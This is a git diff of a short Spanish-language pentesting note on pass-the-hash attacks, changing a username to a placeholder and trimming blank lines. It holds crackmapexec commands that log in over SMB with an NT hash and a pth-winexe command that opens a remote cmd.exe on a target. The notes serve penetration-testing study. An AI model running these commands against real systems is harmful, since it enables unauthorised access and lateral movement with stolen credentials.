@@ -9,17 +9,11 @@ Esta técnica consiste en utilizar los nt-hashes previamente obtenidos para real
 ```bash
 # Con crackmapexec
 crackmapexec -u (user) -H (NT Hash) 
-crackmapexec smb 192.168.0.109 -u "krifel" --hash "64f12cddaa88057e06a81b54e73b949b"
+crackmapexec smb 192.168.0.109 -u "username" --hash "64f12cddaa88057e06a81b54e73b949b"
 
 # Con pth-winexe
 pth-winexe -U <domain/username>%<hash> //<targetIP> cmd.exe
 ```
-
-
-
-
-
-
 
 
 
